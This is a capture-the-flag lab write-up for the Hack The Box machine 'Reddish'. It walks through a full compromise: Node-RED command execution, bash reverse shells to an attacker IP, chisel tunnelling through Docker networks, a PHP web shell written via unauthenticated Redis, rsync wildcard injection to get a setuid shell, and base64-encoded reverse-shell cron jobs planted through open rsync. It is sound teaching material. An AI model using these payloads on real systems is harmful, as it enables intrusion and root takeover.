@@ -1,0 +1,280 @@
+Reddish
+
+22nd January 2019 / Document No D19.100.04
+
+Prepared By: egre55
+Machine Author: yuntao
+Difficulty: Insane
+Classification: Official
+
+                                                                        Page 1 / 18
+SYNOPSIS
+
+Reddish is a very challenging but rewarding machine, which teaches concepts and techniques
+applicable to many situations.
+
+This writeup serves as a written compliment to IppSec's Reddish video, which is a masterclass in
+tunneling, and directly references it. IppSec's videos are packed full of learning and are highly
+recommended!
+
+Skills Required                          Skills Learned
+
+     Basic knowledge of Web application       Gaining situational awareness
+         enumeration techniques               Tunneling
+                                              Exploitation of default Redis
+     Basic knowledge of networking
+     Basic / intermediate knowledge of            configurations
+                                              Leveraging Cron jobs for lateral
+         Linux
+                                                  movement and privilege escalation
+                                              Rsync wildcard abuse
+
+                                         Page 2 / 18
+Enumeration
+Nmap
+
+ masscan -p1-65535,U:1-65535 10.10.10.94 --rate=1000 -p1-65535,U:1-65535 -e
+ tun0 > ports
+ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' |
+ sort -n | tr '\n' ',' | sed 's/,$//')
+ nmap -Pn -sV -sC -p$ports 10.10.10.94
+
+Nmap reveals that only TCP port 1880 is open, which has been identified as Node.js Express
+Framework.
+
+                                                                                                                  Page 3 / 18
+Web Application Enumeration
+
+Visual inspection of the web page reveals that the GET request failed, but a favicon is visible,
+which could help to identify the application. The image is downloaded.
+
+After navigating to Google Images, clicking the camera icon and "Upload an image", the image is
+uploaded and identified as the favicon for the Node-RED application.
+
+After navigating to the web page on port 1880 again, Burp Suite is used to change the request
+type to POST. The path to the Node-RED Editor is returned as JSON data.
+
+                                                                                                                  Page 4 / 18
+Exploitation
+
+Foothold via Node-RED RCE
+
+Node-RED is a programming tool that allows nodes representing devices, APIs and services to be
+linked together. It also contains an "exec" node, allowing for OS command execution. The "tcp"
+input node is dragged to the canvas and configured to connect to the attacking host.
+
+This is connected to an "exec" node, which is itself connected to a "tcp" output node. The output
+node is configured to "Reply to TCP". The three lines connecting the "exec" and "tcp" output node
+represent the three streams stdin, stdout and stderr.
+
+After clicking "Deploy", a shell is received, and a listener is stood up to catch an upgraded shell.
+
+bash -c "bash -i >& /dev/tcp/10.10.14.13/8000 0>&1"
+
+                                                     Page 5 / 18
+Post Exploitation
+Situational Awareness
+
+The /.dockerenv file reveals that the foothold is situated within a Docker container.
+
+netstat is not available, but ss -twurp confirms that there are no other services listening
+locally.
+
+The container is connected to 172.18.0.0 and 172.19.0.0 networks.
+
+These networks are enumerated, and additional hosts 172.19.0.2 and 172.19.0.3 are discovered.
+ for i in $(seq 1 10); do ping -c 1 "172.18.0.$i" | grep from; done
+
+                                                                                                                  Page 6 / 18
+Note: Docker randomizes the assignment of the .2, .3 and .4 IP addresses to the nodered, www
+and redis containers on each boot, requiring us to determine the assignment each time.
+OpenSSL is available and can be used to scan commonly used ports on the identified hosts.
+ for host in 1 2 3 4; do for port in 21 22 25 80 443 8080; do echo
+ 172.19.0.$host:$port & openssl s_client -connect 172.19.0.$host:$port 2>
+ /dev/null | grep CONNECTED; done; done
+
+This reveals that port 80 on 172.19.0.3 is accessible.
+
+                                                                                                                  Page 7 / 18
+Enumeration
+Creation of Tunnel
+
+In order to examine this further, "chisel" (created by Jaime Pillora / @jpillora) is used to set up a
+tunnel and make this port accessible remotely.
+https://github.com/jpillora/chisel
+chisel is installed, a nc listener is stood up to transfer it, and the server is started.
+ curl https://i.jpillora.com/chisel! | bash
+ cp /usr/local/bin/chisel .
+ nc -lvnp 80 < chisel
+ /usr/local/bin/chisel server -p 8002 -reverse -v
+
+chisel is downloaded to 172.19.0.4, the client is started and the tunnel is created.
+ cd /var/tmp
+ cat < /dev/tcp/10.10.14.13/80 > chisel
+ chmod 755 /var/tmp/chisel
+ /var/tmp/chisel client 10.10.14.13:8002 R:127.0.0.1:8001:172.19.0.3:80
+
+                                                                                                                  Page 8 / 18
+Inspection of Web Page
+
+After navigating to the web page, the source code is inspected, which reveals several functions.
+
+                                                                                                                  Page 9 / 18
+The developer has made the web folder accessible to a database container (presumed to be
+172.19.0.2).
+
+Identification of Redis Instance
+
+A full port scan of 172.19.0.2 is undertaken, which reveals that port 6379 is open.
+ for port in $(seq 1 65535); do (echo reddish > /dev/tcp/172.19.0.2/$port &&
+ echo $port) 2> /dev/null; done
+This port is commonly associated with "Redis", an open-source in-memory project that provides
+database, caching a message broker services. The developer of Redis (@antirez), reveals how it
+is possible to exploit "unprotected by default" Redis instances, and what steps can be taken to
+secure Redis if required.
+https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
+
+                                                                                                                 Page 10 / 18
+Lateral Movement to 172.19.0.3
+Write Web Shell
+
+Another tunnel in created on 172.19.0.4, in order to make Redis accessible remotely.
+ /var/tmp/chisel client 10.10.14.13:8002 R:127.0.0.1:6379:172.19.0.2:6379
+In the Reddish video, IppSec uses the following commands to write a webshell to the webroot.
+ nc 172.19.0.2 6379
+ flushall
+ set access "<? system($_REQUEST['cmd']); ?>"
+ config set dbfilename FVEVETEWBE.php
+ config set dir /var/www/html/
+ save
+The webshell is successfully tested with the command id, which returns the expected output.
+
+The browser proxy is set to point to Burp, "localhost" is removed from the "No Proxy for" section,
+and the request is captured.
+
+                                                                                                                  Page 11 / 18
+Upgrade Web Shell to Reverse Shell
+
+Another tunnel is created in preparation for the reverse shell, and a nc listener is stood up on port
+8005.
+ /var/tmp/chisel client 10.10.14.13:8002 9002:127.0.0.1:8005
+The request type is changed to POST, and a request with the reverse shell payload below is sent.
+cmd=bash+-c+"bash+-i+>%26+/dev/tcp/172.19.0.4/9002+0>%261"
+
+A reverse shell from 172.19.0.3 running as www-data is received.
+
+                                                                                                                 Page 12 / 18
+ Identification of "backup" Cron Job
+
+Another tunnel is created in order to facilitate the transfer of LinEnum.sh (created by rebootuser /
+@in-security), before using nc to copy the script.
+https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+ /var/tmp/chisel client 10.10.14.13:8002 9003:127.0.0.1:8006
+ nc -lvnp 8006 < LinEnum.sh
+ cat < /dev/tcp/172.19.0.4/9003 > LinEnum.sh
+Inspection of LinEnum output reveals a Cron job called "backup" within /etc/cron.d
+
+The job executes /backup/backup.sh as root. Examination of this shell script reveals local *.rdb
+files are transferred to the host "backup" from a folder owned by www-data, before restoring the
+local contents of /var/www/html from a previous backup to this host. Of note, rsync is used to
+transfer the files, and the cron rsync command makes use of wildcards. If rsync processes a file
+which includes the "-e" parameter, command execution can be achieved.
+https://gtfobins.github.io/gtfobins/rsync/
+
+                                                                                                                 Page 13 / 18
+Exploitation of Cron Job
+
+The file "reddish.rdb" is created locally with the contents below.
+
+ #!/bin/sh
+ cp /bin/dash /var/tmp/privesc
+ chmod 4755 /var/tmp/privesc
+
+This is base64 transferred to 172.19.0.3.
+
+ base64 -w 0 reddish.rdb
+ IyEvYmluL3NoCmNwIC9iaW4vZGFzaCAvdmFyL3RtcC9wcml2ZXNjCmNobW9kIDQ3NTUgL3Zhci90bXAvcHJ
+ pdmVzYwo=
+ cd /var/tmp
+ echo
+ IyEvYmluL3NoCmNwIC9iaW4vZGFzaCAvdmFyL3RtcC9wcml2ZXNjCmNobW9kIDQ3NTUgL3Zhci90bXAvcHJ
+ pdmVzYwo= | base64 -d -w 0 > reddish.rdb
+
+The file "-e sh reddish.rdb" is created in the www-data owned subdirectory.
+
+ cd /var/www/html; ls
+ cd f187a0ec71ce99642e4f0afbd441a68b/
+ touch -- '-e sh reddish.rdb'
+ mv /var/tmp/reddish.rdb .
+
+The root owned setuid binary "/var/tmp/privesc" is created and is is possible to execute
+commands as root. It can now be confirmed that the host "backup" has IP Address 172.20.0.2.
+
+user.txt can now be gained.
+
+                             Page 14 / 18
+Exploitation of rsync Arbitrary File Write
+
+rsync has been configured such that a password is not required. This allows for any file to be
+read or written, as root on 172.20.0.2.
+
+ rsync -a rsync://backup:873/src/etc/shadow
+
+In order to receive a reverse shell from 172.20.0.2, chisel is transferred to 172.19.0.3.
+
+ nc -lvnp 9004 < chisel (attacking host)
+ /var/tmp/chisel client 10.10.14.13:8002 7011:127.0.0.1:9004 (172.19.0.4)
+ bash -c "cat < /dev/tcp/172.19.0.4/7011 > chisel" (172.19.0.3)
+
+A new chisel server is stood up, in preparation for the multi-hop reverse shell connection.
+
+/usr/local/bin/chisel server -p 5000 -reverse -v  (attacking host)
+
+nc -lvnp 9005  (attacking host)
+
+/var/tmp/chisel client 10.10.14.16:5000 6010:127.0.0.1:5000  (172.19.0.4)
+
+/var/tmp/chisel client 172.19.0.4:6010 7020:127.0.0.1:9005 & (172.19.0.3)
+
+The commands below are then executed on 172.19.0.3, in order to add a reverse shell command
+to the existing "clean" Cron job on 172.20.0.2.
+
+ echo "bash -i >& /dev/tcp/172.20.0.3/7020 0>&1" | base64
+ echo "* * * * * root echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMC4zLzcwMjAgMD4mMQo=
+ | base64 -d | bash" > clean
+ rsync -avp clean rsync://backup:873/src/etc/cron.d/clean
+
+                                                                    Page 15 / 18
+Lateral Movement to 172.20.0.2
+
+Shortly afterwards, a reverse shell is received as root on "backup".
+
+                                                                                                                 Page 16 / 18
+Enumeration of Partitions
+
+Enumeration of /dev reveals several unmounted partitions (sda1 - sda5). These partitions are
+mounted and their contents inspected.
+ cd /var/tmp
+ ls /dev
+ mount
+ mkdir sda{1,2,3,4,5}
+ for number in 1 2 3 4 5; do mount /dev/sda$number sda$number; done
+
+sda1 contains the host filesystem.
+
+A new listener is stood up, and a reverse shell payload is added to a Cron job within
+/sda1/etc/cron.d
+ nc -lvnp 4000
+ echo "bash -i >& /dev/tcp/10.10.14.16/4000 0>&1" | base64
+ echo "* * * * * root echo
+ YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi80MDAwIDA+JjEK | base64 -d |
+ bash" > reddish
+
+                                                                                                                 Page 17 / 18
+Lateral Movement to 10.10.10.94 (Reddish)
+
+The Cron job is run, a shell is received as root on 10.10.10.94 (Reddish), and root.txt can be
+captured.
+
+                                                                                                                 Page 18 / 18
+
